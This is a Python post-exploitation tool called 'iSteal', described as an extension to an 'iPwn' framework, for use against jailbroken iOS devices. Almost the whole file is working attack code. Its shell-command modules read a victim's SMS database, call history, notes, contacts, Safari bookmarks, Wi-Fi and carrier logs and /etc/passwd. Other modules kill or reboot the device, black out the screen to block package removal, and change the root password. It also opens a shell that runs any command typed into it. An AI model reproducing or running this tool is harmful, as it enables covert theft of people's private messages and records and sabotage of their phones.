try:
    import os
    import socket
    import platform
    import subprocess
except:
    print("Make sure to install the required modules!")


# iSteal - An extension made for post exploitation for the iPwn Framework.
# 05/24/21
# Made by 0x1CA3 | https://github.com/0x1CA3


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
clear()

bannerz = """
.__  _________ __                .__   
|__|/   _____//  |_  ____ _____  |  |  
|  |\_____  \\   __\/ __ \\__  \ |  |  
|  |/        \|  | \  ___/ / __ \|  |__
|__/_______  /|__|  \___  >____  /____/
           \/           \/     \/      

An extension for post-exploitation for the iPwn framework.
Made by https://github.com/0x1CA3
Use 'help' or 'options' for commands.
"""

class commandz(object):
    commandz = \
        {
            "use modules/dump_etc_passwd": "cd / && cat etc/passwd",
            "use modules/list_installed_default_apps": "cd / && cd Applications && ls",
            "use modules/phone_build_and_version": "cd / && cd /System/Library/Accounts/AppleIDLoginPlugins/iCloudAppleIDLoginPlugin.bundle && cat Info.plist",
            "use modules/network/dump_wifi_logs": "cd / && cd /var/wireless/awdd/applogs/wifi && ls",
            "use modules/network/dump_carrier_logs": "cd / && cd /var/wireless/awdd/staging && ls",
            "use modules/network/dump_DataUsage_DB": "cd / && cd /var/wireless/Library/Databases && cat CellularUsage.db",
            "use modules/imessage/dump_SMS_DB": "cd / && cd /var/mobile/Library/SMS && cat sms.db",
            "use modules/imessage/dump_all_numbers": "cd / && cd /var/mobile/Library/SMS && cat chatRenderMetaData.db",
            "use modules/imessage/emergency_alert_history": "cd / && cd /var/mobile/Library/SMS/EmergencyAlerts && cat PriorAlerts.plist",
            "use modules/imessage/get_call_logs": "cd / && cd /var/mobile/Library/CallHistoryDB && cat CallHistory.storedata",
            "use modules/safari/get_bookmarks": "cd / && cd /var/mobile/Library/Safari && cat Bookmarks.db",
            "use modules/extra/restart_springboard": "killall SpringBoard",
            "use modules/extra/boot_safemode": "touch /var/mobile/Library/Preferences/com.saurik.mobilesubstrate.dat; killall SpringBoard",
            "use modules/extra/restart_device": "kill 1",
            "use modules/extra/get_saved_notes": "cd / && cd /var/mobile/Library/Notes/ && cat notes.sqlite",
            "use modules/extra/change_root_password": "./passwd",
            "use modules/network/get_mac_address": "bluetoothd",
            "use modules/extra/screen_black_out": "cd / && cd /Applications/Cydia.app && ./Cydia",
            "use modules/extra/kill_app": "ps aux"
        }

def terminal():
    print("To return back to the main menu, use the 'back' command.")
    while True:
        terminalinput = input("\niSteal (terminal)\n  |===> ")
        if terminalinput == "back":
            clear()
            print(bannerz)
            mainshell()
        os.system("{}".format(terminalinput))

def mainshell():
    while True:
        maininput = input("\niSteal\n  |===> ")
        if maininput == "help" or maininput == "options":
            print(''' 
            Commands              Description
            --------              -----------
            help                  Displays available commands.
            list                  Lists all modules for post-exploitation.
            use [specific/module] Loads a module that you choose against the iOS device. Example: use modules/dump_etc_passwd
            command               Execute an OS command.
            banner                Reloads the banner.
            clear                 Clears the screen.
            exit                  Exits the framework.
            ''')
        elif maininput == "list":
            print(''' 
            Modules                                   Description
            -------                                   -----------
            modules/dump_etc_passwd                   Dumps etc/passwd.
            modules/list_installed_default_apps       Lists all the installed default/common applications.
            modules/phone_build_and_version           Lists information about the phone build and version, along with other things.
            modules/network/dump_wifi_logs            Dumps Wi-Fi log files and gives you the option to read them.
            modules/network/dump_carrier_logs         Dumps the phone carrier log files and gives you the option to read them. [IP logs included]
            modules/network/dump_DataUsage_DB         Dumps the DB containing the iOS device's data usage and phone number.
            modules/network/get_mac_address           Gets the MAC-Address of the target device.
            modules/imessage/dump_SMS_DB              Dumps the DB containing the iOS device's message history.
            modules/imessage/dump_all_numbers         Dumps all the saved numbers on the iOS device's list.
            modules/imessage/emergency_alert_history  Shows the history of emergency alerts with the message. [Stuff like AMBER Alerts]
            modules/imessage/get_call_logs            Gets the call history of the iOS device. [Even Discord calls]
            modules/safari/get_bookmarks              Gets the saved bookmarks in Safari.
            modules/extra/restart_springboard         Makes the device black out while it restarts SpringBoard in the background.
            modules/extra/boot_safemode               Makes the device boot into SafeMode.
            modules/extra/restart_device              Restarts the iOS device.
            modules/extra/get_saved_notes             Gets the saved notes on the iOS device.
            modules/extra/kill_app                    Lets you view running processes and kill them. [Like apps/services such as youtube, safari, camera, bluetooth]
            modules/extra/screen_black_out            Makes the victims home screen go black if they attempt to enter cydia to remove packages.
            modules/extra/change_root_password        Allows you to change the root password.
            ''')
        elif maininput == "clear":
            clear()
        elif maininput == "banner":
            clear()
            print(bannerz)
        elif maininput == "exit":
            exit()
        elif maininput == "command":
            terminal()
        elif maininput == "use modules/dump_etc_passwd":
            subprocess.call(commandz.commandz["use modules/dump_etc_passwd"], shell=True)
        elif maininput == "use modules/list_installed_default_apps":
            subprocess.call(commandz.commandz["use modules/list_installed_default_apps"], shell=True)
        elif maininput == "use modules/phone_build_and_version":
            subprocess.call(commandz.commandz["use modules/phone_build_and_version"], shell=True)
        elif maininput == "use modules/network/dump_wifi_logs":
            subprocess.call(commandz.commandz["use modules/network/dump_wifi_logs"], shell=True)
            wifiloginput = input("\n[Pick a file to dump contents from. Example: example.consolidated.metriclog]\n  |===> ")    
            os.system("cd / && cd /var/wireless/awdd/applogs/wifi && cat {}".format(wifiloginput))
        elif maininput == "use modules/network/dump_carrier_logs":
            subprocess.call(commandz.commandz["use modules/network/dump_carrier_logs"], shell=True)
            isploginput = input("\n[Pick a file to dump contents from. Example: example.consolidated.metriclog]\n  |===> ")
            os.system("cd / && cd /var/wireless/awdd/staging && cat {}".format(isploginput))
        elif maininput == "use modules/network/dump_DataUsage_DB":
            subprocess.call(commandz.commandz["use modules/network/dump_DataUsage_DB"], shell=True)
        elif maininput == "use modules/imessage/dump_SMS_DB":
            subprocess.call(commandz.commandz["use modules/imessage/dump_SMS_DB"], shell=True)
        elif maininput == "use modules/imessage/dump_all_numbers":
            subprocess.call(commandz.commandz["use modules/imessage/dump_all_numbers"], shell=True)
        elif maininput == "use modules/imessage/emergency_alert_history":
            subprocess.call(commandz.commandz["use modules/imessage/emergency_alert_history"], shell=True)
        elif maininput == "use modules/imessage/get_call_logs":
            subprocess.call(commandz.commandz["use modules/imessage/get_call_logs"], shell=True)
        elif maininput == "use modules/safari/get_bookmarks":
            subprocess.call(commandz.commandz["use modules/safari/get_bookmarks"], shell=True)
        elif maininput == "use modules/extra/restart_springboard":
            subprocess.call(commandz.commandz["use modules/extra/restart_springboard"], shell=True)
        elif maininput == "use modules/extra/boot_safemode":
            subprocess.call(commandz.commandz["use modules/extra/boot_safemode"], shell=True)
        elif maininput == "use modules/extra/restart_device":
            subprocess.call(commandz.commandz["use modules/extra/restart_device"], shell=True)
        elif maininput == "use modules/extra/get_saved_notes":
            subprocess.call(commandz.commandz["use modules/extra/get_saved_notes"], shell=True)
        elif maininput == "use modules/extra/change_root_password":
            subprocess.call(commandz.commandz["use modules/extra/change_root_password"], shell=True)
        elif maininput == "use modules/network/get_mac_address":
            subprocess.call(commandz.commandz["use modules/network/get_mac_address"], shell=True)
        elif maininput == "use modules/extra/screen_black_out":
            subprocess.call(commandz.commandz["use modules/extra/screen_black_out"], shell=True)
        elif maininput == "use modules/extra/kill_app":
            subprocess.call(commandz.commandz["use modules/extra/kill_app"], shell=True)
            kilappinput = input("Enter PID of app you want to kill > ")
            os.system("kill {}".format(kilappinput))
        else:
            print(f"Command [{maininput}] was not found.")
print(bannerz)
mainshell()

# subprocess.call(commandz.commandz[""], shell=True)
# added this as a comment so i can add more modules l8er
# :)